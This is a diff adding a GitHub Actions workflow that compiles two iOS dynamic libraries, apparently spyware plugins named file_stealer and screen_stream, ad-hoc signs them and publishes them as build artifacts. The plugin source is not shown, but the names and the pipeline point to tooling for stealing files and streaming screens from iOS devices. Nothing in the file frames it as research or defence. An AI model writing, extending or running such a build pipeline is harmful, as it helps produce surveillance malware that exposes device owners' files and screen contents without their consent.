@@ -1,0 +1,38 @@
+name: Build iOS Plugins
+
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  build_plugins:
+    runs-on: macos-latest
+
+    steps:
+    - name: Checkout Repository
+      uses: actions/checkout@v4
+
+    - name: Compile Plugins (.dylib)
+      run: |
+        SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
+        
+        echo "Compiling file_stealer.dylib..."
+        clang++ -arch arm64 -isysroot $SDK_PATH -dynamiclib -fobjc-arc \
+          -framework Foundation file_stealer.mm -o file_stealer.dylib
+
+        echo "Compiling screen_stream.dylib..."
+        clang++ -arch arm64 -isysroot $SDK_PATH -dynamiclib -fobjc-arc \
+          -framework Foundation -framework UIKit -framework CoreGraphics screen_stream.mm -o screen_stream.dylib
+
+        echo "Signing plugins..."
+        codesign -s - -f file_stealer.dylib
+        codesign -s - -f screen_stream.dylib
+
+    - name: Upload Plugin Artifacts
+      uses: actions/upload-artifact@v4
+      with:
+        name: ios_plugins
+        path: |
+          file_stealer.dylib
+          screen_stream.dylib
